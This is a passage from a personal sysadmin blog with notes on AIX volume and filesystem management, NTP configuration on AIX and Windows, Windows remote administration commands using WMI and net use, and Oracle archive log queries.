<h1 id="显示卷组的基本信息"><a href="#显示卷组的基本信息" class="headerlink" title="显示卷组的基本信息"></a>显示卷组的基本信息</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dhdev01 / # lsvg rootvg</span><br><span class="line">VOLUME GROUP:   rootvg                   VG IDENTIFIER:  00585c0f00004c00000000f98e1e377f</span><br><span class="line">VG STATE:       active                   PP SIZE:        128 megabyte(s)</span><br><span class="line">VG PERMISSION:  read/write               TOTAL PPs:      546 (69888 megabytes)</span><br><span class="line">MAX LVs:        256                      FREE PPs:       111 (14208 megabytes)</span><br><span class="line">LVs:            16                       USED PPs:       435 (55680 megabytes)</span><br><span class="line">OPEN LVs:       13                       QUORUM:         2</span><br><span class="line">TOTAL PVs:      1                        VG DESCRIPTORS: 2</span><br><span class="line">STALE PVs:      0                        STALE PPs:      0</span><br><span class="line">ACTIVE PVs:     1                        AUTO ON:        yes</span><br><span class="line">MAX PPs per PV: 1016                     MAX PVs:        32</span><br><span class="line">LTG size:       128 kilobyte(s)          AUTO SYNC:      no</span><br><span class="line">HOT SPARE:      no                       BB POLICY:      relocatable</span><br></pre></td></tr></table></figure>

<h1 id="显示该卷组存在的所有逻辑卷"><a href="#显示该卷组存在的所有逻辑卷" class="headerlink" title="显示该卷组存在的所有逻辑卷"></a>显示该卷组存在的所有逻辑卷</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">dhdev01 / # lsvg -l rootvg</span><br><span class="line">rootvg:</span><br><span class="line">LV NAME             TYPE       LPs   PPs   PVs  LV STATE      MOUNT POINT</span><br><span class="line">hd5                 boot       1     1     1    closed/syncd  N/A</span><br><span class="line">hd6                 paging     32    32    1    open/syncd    N/A</span><br><span class="line">hd8                 jfslog     1     1     1    open/syncd    N/A</span><br><span class="line">hd4                 jfs        3     3     1    open/syncd    /</span><br><span class="line">hd2                 jfs        88    88    1    open/syncd    /usr</span><br><span class="line">hd9var              jfs        8     8     1    open/syncd    /var</span><br><span class="line">hd3                 jfs        22    22    1    open/syncd    /tmp</span><br><span class="line">hd1                 jfs        8     8     1    open/syncd    /home</span><br><span class="line">hd10opt             jfs        3     3     1    open/syncd    /opt</span><br><span class="line">lg_dumplv           sysdump    8     8     1    open/syncd    N/A</span><br><span class="line">lv00                jfs        148   148   1    open/syncd    /u01</span><br><span class="line">lv01                jfs        24    24    1    open/syncd    /u02</span><br><span class="line">lv02                jfs        24    24    1    open/syncd    /oradisk</span><br><span class="line">dh                  jfs        32    32    1    open/syncd    /dh</span><br><span class="line">loglv03             jfs2log    1     1     1    closed/syncd  N/A</span><br><span class="line">fslv00              jfs2       32    32    1    closed/syncd  /cd0</span><br></pre></td></tr></table></figure>

<h1 id="显示所有物理卷的基本信息"><a href="#显示所有物理卷的基本信息" class="headerlink" title="显示所有物理卷的基本信息"></a>显示所有物理卷的基本信息</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dhdev01 / # lspv</span><br><span class="line">hdisk0          00585c0f8e1e2d11                    rootvg          active</span><br><span class="line">hdisk1          00585c0f746525a4                    vg01            active</span><br><span class="line">hdisk2          00585c0f545aca55                    vg02            active</span><br><span class="line">hdisk3          00585c0f418e185b                    bkvg            active</span><br></pre></td></tr></table></figure>

<h1 id="显示某个物理卷的基本信息"><a href="#显示某个物理卷的基本信息" class="headerlink" title="显示某个物理卷的基本信息"></a>显示某个物理卷的基本信息</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dhdev01 / # lspv hdisk0</span><br><span class="line">PHYSICAL VOLUME:    hdisk0                   VOLUME GROUP:     rootvg</span><br><span class="line">PV IDENTIFIER:      00585c0f8e1e2d11 VG IDENTIFIER     00585c0f00004c00000000f98e1e377f</span><br><span class="line">PV STATE:           active</span><br><span class="line">STALE PARTITIONS:   0                        ALLOCATABLE:      yes</span><br><span class="line">PP SIZE:            128 megabyte(s)          LOGICAL VOLUMES:  16</span><br><span class="line">TOTAL PPs:          546 (69888 megabytes)    VG DESCRIPTORS:   2</span><br><span class="line">FREE PPs:           111 (14208 megabytes)    HOT SPARE:        no</span><br><span class="line">USED PPs:           435 (55680 megabytes)</span><br><span class="line">FREE DISTRIBUTION:  00..00..00..02..109</span><br><span class="line">USED DISTRIBUTION:  110..109..109..107..00</span><br></pre></td></tr></table></figure>

<h1 id="显示该物理卷上存在的所有逻辑卷"><a href="#显示该物理卷上存在的所有逻辑卷" class="headerlink" title="显示该物理卷上存在的所有逻辑卷"></a>显示该物理卷上存在的所有逻辑卷</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">dhdev01 / # lspv -l hdisk0</span><br><span class="line">hdisk0:</span><br><span class="line">LV NAME               LPs   PPs   DISTRIBUTION          MOUNT POINT</span><br><span class="line">hd5                   1     1     01..00..00..00..00    N/A</span><br><span class="line">lv00                  148   148   53..43..17..35..00    /u01</span><br><span class="line">dh                    32    32    32..00..00..00..00    /dh</span><br><span class="line">lv02                  24    24    24..00..00..00..00    /oradisk</span><br><span class="line">hd6                   32    32    00..32..00..00..00    N/A</span><br><span class="line">lg_dumplv             8     8     00..08..00..00..00    N/A</span><br><span class="line">lv01                  24    24    00..16..08..00..00    /u02</span><br><span class="line">hd2                   88    88    00..10..65..13..00    /usr</span><br><span class="line">hd8                   1     1     00..00..01..00..00    N/A</span><br><span class="line">hd4                   3     3     00..00..01..02..00    /</span><br><span class="line">hd9var                8     8     00..00..04..04..00    /var</span><br><span class="line">hd3                   22    22    00..00..06..16..00    /tmp</span><br><span class="line">hd1                   8     8     00..00..06..02..00    /home</span><br><span class="line">hd10opt               3     3     00..00..01..02..00    /opt</span><br><span class="line">loglv03               1     1     00..00..00..01..00    N/A</span><br><span class="line">fslv00                32    32    00..00..00..32..00    /cd0</span><br></pre></td></tr></table></figure>

<p> 如果卷组内只有一个物理卷，那么卷组内的逻辑卷信息和物理卷内的逻辑卷信息是一致的。</p>
<h1 id="显示物理卷中的每个物理分区-outer-edge-outer-middle-center-inner-middle-inner-edge"><a href="#显示物理卷中的每个物理分区-outer-edge-outer-middle-center-inner-middle-inner-edge" class="headerlink" title="显示物理卷中的每个物理分区(outer edge, outer middle, center, inner middle, inner edge)"></a>显示物理卷中的每个物理分区(outer edge, outer middle, center, inner middle, inner edge)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dhdev01 / # lspv -p hdisk1</span><br><span class="line">hdisk1:</span><br><span class="line">PP RANGE  STATE   REGION        LV NAME             TYPE       MOUNT POINT</span><br><span class="line">  1-32    used    outer edge    db                  jfs        /dh/db</span><br><span class="line"> 33-36    used    outer edge    rdhdev_test2        raw        N/A</span><br><span class="line"> 37-74    used    outer edge    testdb              jfs        /test</span><br><span class="line"> 75-110   used    outer edge    rdhdev_test         raw        N/A</span><br><span class="line">111-190   used    outer middle  db                  jfs        /dh/db</span><br><span class="line">191-191   used    outer middle  loglv00             jfslog     N/A</span><br><span class="line">192-219   used    outer middle  patch               jfs        /opt/patch</span><br><span class="line">220-223   used    center        patch               jfs        /opt/patch</span><br><span class="line">224-261   used    center        testdb2             jfs        /test2</span><br><span class="line">262-281   used    center        db                  jfs        /dh/db</span><br><span class="line">282-287   used    center        patch               jfs        /opt/patch</span><br><span class="line">288-328   used    center        db                  jfs        /dh/db</span><br><span class="line">329-409   used    inner middle  db                  jfs        /dh/db</span><br><span class="line">410-410   used    inner middle  lv03                raw        N/A</span><br><span class="line">411-411   used    inner middle  rawtest             raw        N/A</span><br><span class="line">412-437   free    inner middle</span><br><span class="line">438-546   free    inner edge</span><br></pre></td></tr></table></figure>

<h1 id="显示某个逻辑卷的信息"><a href="#显示某个逻辑卷的信息" class="headerlink" title="显示某个逻辑卷的信息"></a>显示某个逻辑卷的信息</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">dhdev01 / # lslv hd1</span><br><span class="line">LOGICAL VOLUME:     hd1                    VOLUME GROUP:   rootvg</span><br><span class="line">LV IDENTIFIER:      00585c0f00004c00000000f98e1e377f.8 PERMISSION:     read/write</span><br><span class="line">VG STATE:           active/complete        LV STATE:       opened/syncd</span><br><span class="line">TYPE:               jfs                    WRITE VERIFY:   off</span><br><span class="line">MAX LPs:            512                    PP SIZE:        128 megabyte(s)</span><br><span class="line">COPIES:             1                      SCHED POLICY:   parallel</span><br><span class="line">LPs:                8                      PPs:            8</span><br><span class="line">STALE PPs:          0                      BB POLICY:      relocatable</span><br><span class="line">INTER-POLICY:       minimum                RELOCATABLE:    yes</span><br><span class="line">INTRA-POLICY:       center                 UPPER BOUND:    32</span><br><span class="line">MOUNT POINT:        /home                  LABEL:          /home</span><br><span class="line">MIRROR WRITE CONSISTENCY: on/ACTIVE</span><br><span class="line">EACH LP COPY ON A SEPARATE PV ?: yes</span><br><span class="line">Serialize IO ?:     NO</span><br><span class="line">dhdev01 / # df -g</span><br><span class="line">Filesystem    GB blocks      Free %Used    Iused %Iused Mounted on</span><br><span class="line">/dev/hd4           0.38      0.23   40%     3349     2% /</span><br><span class="line">/dev/hd2          11.00      2.45   78%   108362     4% /usr</span><br><span class="line">/dev/hd9var        1.00      0.48   52%      816     1% /var</span><br><span class="line">/dev/hd3           2.75      1.87   33%    10855     2% /tmp</span><br><span class="line">/dev/hd1           1.00      0.46   55%     4222     2% /home</span><br><span class="line">/proc                 -         -    -         -     -  /proc</span><br><span class="line">/dev/hd10opt       0.38      0.17   56%     3987     5% /opt</span><br><span class="line">/dev/lv00         18.50      2.15   89%    97608     3% /u01</span><br><span class="line">/dev/lv01          3.00      0.70   77%       36     1% /u02</span><br><span class="line">/dev/lv02          3.00      2.91    4%       17     1% /oradisk</span><br><span class="line">/dev/dh            4.00      2.56   36%    69153     7% /dh</span><br><span class="line">/dev/db           31.75     18.40   43%       57     1% /dh/db</span><br><span class="line">/dev/patch         4.75      0.26   95%     7607     1% /opt/patch</span><br><span class="line">/dev/piers         4.38      0.92   80%    27870     3% /piers</span><br><span class="line">/dev/piersdb      12.50      1.44   89%       55     1% /piers/db</span><br><span class="line">/dev/uatbkup      19.75     19.03    4%       30     1% /piers/db/uatbkup</span><br><span class="line">/dev/dailybkup      9.88      7.33   26%     2450     1% /piers/dailybkup</span><br><span class="line">/dev/dbbkuplv     40.00     13.42   67%    91429     3% /dbbkup</span><br></pre></td></tr></table></figure>

<p> PP SIZE * PPs(128 megabyte(s) * 8) &#x3D;&#x3D; 1024M<br> 表示逻辑卷hd1(Filesystem: &#x2F;dev&#x2F;hd1, Mounted on: &#x2F;home)有1.00 GB blocks</p>
<h1 id="查看逻辑卷在物理卷上的分布"><a href="#查看逻辑卷在物理卷上的分布" class="headerlink" title="查看逻辑卷在物理卷上的分布"></a>查看逻辑卷在物理卷上的分布</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">dhdev01 / # lslv -l hd1</span><br><span class="line">hd1:/home</span><br><span class="line">PV                COPIES        IN BAND       DISTRIBUTION</span><br><span class="line">hdisk0            008:000:000   75%           000:000:006:002:000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dhdev01 / # lslv -m hd1</span><br><span class="line">hd1:/home</span><br><span class="line">LP    PP1  PV1               PP2  PV2               PP3  PV3</span><br><span class="line">0001  0225 hdisk0</span><br><span class="line">0002  0241 hdisk0</span><br><span class="line">0003  0242 hdisk0</span><br><span class="line">0004  0309 hdisk0</span><br><span class="line">0005  0310 hdisk0</span><br><span class="line">0006  0311 hdisk0</span><br><span class="line">0007  0336 hdisk0</span><br><span class="line">0008  0413 hdisk0</span><br><span class="line">dhdev01 / # lspv -p hdisk0|grep /home</span><br><span class="line">225-225   used    center        hd1                 jfs        /home</span><br><span class="line">241-242   used    center        hd1                 jfs        /home</span><br><span class="line">309-311   used    center        hd1                 jfs        /home</span><br><span class="line">336-336   used    inner middle  hd1                 jfs        /home</span><br><span class="line">413-413   used    inner middle  hd1                 jfs        /home</span><br></pre></td></tr></table></figure>

<p> 说明：<br> DISTRIBUTION(000:000:006:002:000) 表示center有6个物理分区(对应第1-6的逻辑分区)，inner middle有2个物理分区(对应7-8的逻辑分区)<br> COPIES(008:000:000) 表示第一个物理卷上有8个物理分区，没有第二和第三的拷贝分区<br> IN BAND(75%) 表示center[6] &#x2F; center[6] + inner middle[2] &#x3D; 0.75</p>
<h1 id="增加某个文件系统的空间"><a href="#增加某个文件系统的空间" class="headerlink" title="增加某个文件系统的空间"></a>增加某个文件系统的空间</h1><ol>
<li>df -g | grep &#x2F;home 查看&#x2F;home所属的逻辑卷，假设是hd1</li>
<li>lslv -l hd1 查看hd1所属的物理卷，假设是hdisk0</li>
<li>lspv -p hdisk0 查看物理卷的可用空间</li>
<li>smitty chfs 或者 chfs -a size&#x3D;+10G &#x2F;home</li>
<li>如果执行上述命令时出现问题:Maximum allocation for logical volume hd1，运行命令<br>chlv -x 800 hd1 或 smitty chlv 或 smitty lv<br>Please refer to <a target="_blank" rel="noopener" href="http://geekswing.com/geek/how-to-expand-a-filesystem-in-aix-df-lsvg-chfs/">how-to-expand-a-filesystem-in-aix-df-lsvg-chfs</a> or <a target="_blank" rel="noopener" href="http://www.unixmantra.com/2014/01/practical-guide-to-aix-logical-volume-management.html">practical-guide-to-aix-logical-volume-management</a></li>
<li>extendlv与chfs是很接近的，但增加文件空间需要用chfs，不要用extendlv，因为extendlv会扩大逻辑分区，但不能反映的文件空间上的。</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h1><p><a target="_blank" rel="noopener" href="http://www.web-manual.net/aix/0516-787-extendlv-maximum-allocation-for-logical-volume-hd11admin-is-512/">http://www.web-manual.net/aix/0516-787-extendlv-maximum-allocation-for-logical-volume-hd11admin-is-512/</a><br><a target="_blank" rel="noopener" href="http://wenku.baidu.com/view/f02cac4533687e21af45a960.html">http://wenku.baidu.com/view/f02cac4533687e21af45a960.html</a><br><a target="_blank" rel="noopener" href="http://unix.ittoolbox.com/groups/technical-functional/ibm-aix-l/in-band-in-lslv-l-1110087">http://unix.ittoolbox.com/groups/technical-functional/ibm-aix-l/in-band-in-lslv-l-1110087</a><br><a target="_blank" rel="noopener" href="http://unix.ittoolbox.com/groups/technical-functional/ibm-aix-l/increasing-the-filesystem-size-2639934">http://unix.ittoolbox.com/groups/technical-functional/ibm-aix-l/increasing-the-filesystem-size-2639934</a><br><a target="_blank" rel="noopener" href="http://www.tek-tips.com/viewthread.cfm?qid=1150552">http://www.tek-tips.com/viewthread.cfm?qid=1150552</a><br><a target="_blank" rel="noopener" href="http://www.unix.com/aix/25249-increase-logical-partition.html">http://www.unix.com/aix/25249-increase-logical-partition.html</a></p>
<h2 id="In-band解释"><a href="#In-band解释" class="headerlink" title="In-band解释"></a>In-band解释</h2><p><a target="_blank" rel="noopener" href="http://unix.ittoolbox.com/groups/technical-functional/ibm-aix-l/in-band-in-lslv-l-1110087">http://unix.ittoolbox.com/groups/technical-functional/ibm-aix-l/in-band-in-lslv-l-1110087</a><br><a target="_blank" rel="noopener" href="http://pic.dhe.ibm.com/infocenter/powersys/v3r1m5/index.jsp?topic=/iphcg/lslv.htm">http://pic.dhe.ibm.com/infocenter/powersys/v3r1m5/index.jsp?topic=/iphcg/lslv.htm</a><br><a target="_blank" rel="noopener" href="http://www.ibm.com/developerworks/forums/thread.jspa?messageID=14532561">http://www.ibm.com/developerworks/forums/thread.jspa?messageID=14532561</a></p>
<h2 id="extendlv与chfs的区别"><a href="#extendlv与chfs的区别" class="headerlink" title="extendlv与chfs的区别"></a>extendlv与chfs的区别</h2><p><a target="_blank" rel="noopener" href="http://networktechnologist.com/tips-aix-lvm.html">http://networktechnologist.com/tips-aix-lvm.html</a><br><a target="_blank" rel="noopener" href="http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.cmds/doc/aixcmds2/extendlv.htm">http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.cmds/doc/aixcmds2/extendlv.htm</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-NTP-setting-on-AIX-and-Windows" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-10-11T01:36:59.000Z"><a href="/2012/10/11/NTP-setting-on-AIX-and-Windows/">2012-10-11</a></time>
      
      
  
    <h1 class="title"><a href="/2012/10/11/NTP-setting-on-AIX-and-Windows/">NTP setting on AIX and Windows</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="AIX"><a href="#AIX" class="headerlink" title="AIX:"></a>AIX:</h1><h2 id="Server-side-10-13-135-72"><a href="#Server-side-10-13-135-72" class="headerlink" title="Server side(10.13.135.72)"></a>Server side(10.13.135.72)</h2><ol>
<li>vi &#x2F;etc&#x2F;ntp.conf<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">broadcastclient</span><br><span class="line">server 127.127.1.0 prefer</span><br><span class="line">driftfile /etc/ntp.drift</span><br><span class="line">tracefile /etc/ntp.trace</span><br></pre></td></tr></table></figure></li>
<li><code>startsrc -s xntpd</code></li>
<li><code>lssrc -ls xntpd</code></li>
</ol>
<h2 id="Client-side-10-13-135-71"><a href="#Client-side-10-13-135-71" class="headerlink" title="Client side(10.13.135.71)"></a>Client side(10.13.135.71)</h2><h3 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1:"></a>Method 1:</h3><ol>
<li>vi &#x2F;etc&#x2F;ntp.conf<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">broadcastclient</span><br><span class="line">server 10.13.135.71</span><br><span class="line">driftfile /etc/ntp.drift</span><br><span class="line">tracefile /etc/ntp.trace</span><br></pre></td></tr></table></figure></li>
<li><code>startsrc -s xntpd</code></li>
<li><code>lssrc -ls xntpd</code></li>
</ol>
<h3 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2:"></a>Method 2:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntpdate 10.13.135.72</span><br><span class="line">crontab -e</span><br><span class="line">0 5,12 * * * ntpdate 10.13.135.72</span><br></pre></td></tr></table></figure>

<h2 id="Windows-Client"><a href="#Windows-Client" class="headerlink" title="Windows Client"></a>Windows Client</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">w32tm /stripchart /computer:10.13.135.72 /samples:2 /dataonly</span><br><span class="line">w32tm /config /syncfromflags:manual /manualpeerlist:10.13.135.72</span><br><span class="line">w32tm /config /update</span><br><span class="line">net stop w32time</span><br><span class="line">net start w32time</span><br></pre></td></tr></table></figure>

<h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref:"></a>Ref:</h1><p><a target="_blank" rel="noopener" href="http://www-01.ibm.com/support/docview.wss?uid=isg3T1000653">http://www-01.ibm.com/support/docview.wss?uid=isg3T1000653</a><br><a target="_blank" rel="noopener" href="http://www.aixchina.net/club/thread-1630-1-1.html">http://www.aixchina.net/club/thread-1630-1-1.html</a><br><a target="_blank" rel="noopener" href="http://www.wretch.cc/blog/jerry0822/13996334">http://www.wretch.cc/blog/jerry0822/13996334</a><br><a target="_blank" rel="noopener" href="http://technet.microsoft.com/zh-cn/library/cc773263(v=ws.10).aspx">http://technet.microsoft.com/zh-cn/library/cc773263(v=ws.10).aspx</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-misc-of-command" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-09-26T08:25:39.000Z"><a href="/2012/09/26/misc-of-command/">2012-09-26</a></time>
      
      
  
    <h1 class="title"><a href="/2012/09/26/misc-of-command/">misc of command</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Windows-get-uptime"><a href="#Windows-get-uptime" class="headerlink" title="Windows get uptime"></a>Windows get uptime</h1><ol>
<li><code>net stats srv|findstr</code></li>
<li><code>systeminfo | find &quot;System Boot Time:&quot;</code></li>
<li><code>eventvwr.msc -&gt; filter EventID(6005)</code></li>
</ol>
<h1 id="Control-a-service"><a href="#Control-a-service" class="headerlink" title="Control a service"></a>Control a service</h1><ol>
<li><p><code>net start tlntsvr</code></p>
</li>
<li><p><code>sc \\hostname start tlntsvr</code></p>
</li>
<li><p>Enable telnet service</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$tlntsvr = gwmi -ComputerName webserver -Class Win32_Service -filter &quot;name=&#x27;tlntsvr&#x27;&quot; -Credential $cred</span><br><span class="line"></span><br><span class="line">$tlntsvr.ChangeStartMode(&quot;Manual&quot;) (default it is Disabled)</span><br><span class="line"></span><br><span class="line">$tlntsvr.StartService()</span><br><span class="line"></span><br><span class="line">$ihs = gwmi -ComputerName webserver -Class Win32_Service -filter &quot;name like &#x27;IBM%1.3%&#x27;&quot; -Credential $cred</span><br></pre></td></tr></table></figure>
</li>
<li><p>Enable remote desktop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$terminalService = gwmi -Class Win32_TerminalServiceSetting -Namespace root\cimv2\terminalservices -ComputerName webserver -Credential $cred //Windows Vista and Windows Server 2008</span><br><span class="line"></span><br><span class="line">$terminalService = gwmi -Class Win32_TerminalServiceSetting -Namespace root\cimv2 -ComputerName webserver -Credential $cred //Windows XP and Windows Server 2003</span><br><span class="line"></span><br><span class="line">$terminalService.AllowTsConnections // test the state</span><br><span class="line"></span><br><span class="line">$terminalService.SetAllowTSConnections(1)</span><br></pre></td></tr></table></figure>
</li>
<li><p>View eventlog by powershell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$username = &quot;admin&quot;</span><br><span class="line">$password = &quot;password&quot;</span><br><span class="line">$secstr = New-Object -TypeName System.Security.SecureString</span><br><span class="line">$password.ToCharArray() | ForEach-Object &#123;$secstr.AppendChar($_)&#125;</span><br><span class="line">$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr</span><br><span class="line"></span><br><span class="line">$time = [System.Management.ManagementDateTImeConverter]::ToDmtfDateTime((Get-Date).AddHours(-72))</span><br><span class="line"></span><br><span class="line">gwmi Win32_NTLogEvent -filter &quot;(LogFile=&#x27;System&#x27;) AND (Type=&#x27;Error&#x27;) AND (TimeWritten &gt;= &#x27;$time&#x27;)&quot; -computer webserver -credential $cred | ft EventCode, EventType, Message -auto</span><br></pre></td></tr></table></figure></li>
<li><p>Open remote server path <code>net use \\webserver\ipc$ password /user:username \\werbserver\c$</code></p>
</li>
</ol>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="http://ss64.com/nt/sc.html">http://ss64.com/nt/sc.html</a><br><a target="_blank" rel="noopener" href="http://www.petri.co.il/check-uptime-in-server-2008.htm&quot;">http://www.petri.co.il/check-uptime-in-server-2008.htm&quot;</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-oracle-archive-log" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2012-09-25T00:27:44.000Z"><a href="/2012/09/25/oracle-archive-log/">2012-09-25</a></time>
      
      
  
    <h1 class="title"><a href="/2012/09/25/oracle-archive-log/">oracle archive log</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="to-check-setting-about-archive-log"><a href="#to-check-setting-about-archive-log" class="headerlink" title="to check setting about archive log"></a>to check setting about archive log</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sqlplus /nolog</span><br><span class="line">conn /as sysdba</span><br><span class="line"></span><br><span class="line">SQL&gt;archive log list</span><br><span class="line">SQL&gt;show parameter archive</span><br><span class="line"></span><br><span class="line">sql&gt;select * from v$archive_processes;</span><br><span class="line">sql&gt;select log_mode from v$database;</span><br><span class="line">sql&gt;select archiver from v$instance</span><br><span class="line"></span><br><span class="line">sql&gt;select group#,members,sequence#,archived,status,first_change#,to_char(first_time, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  first_change_time from v$log;</span><br><span class="line">sql&gt;select name,sequence#,archived,status,first_change#, to_char(first_time, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;) first_change_time from v$archived_log;</span><br><span class="line"></span><br><span class="line">SQL&gt;select * from V$BACKUP_REDOLOG;</span><br><span class="line">SQL&gt;select * from V$archive_dest;</span><br></pre></td></tr></table></figure>

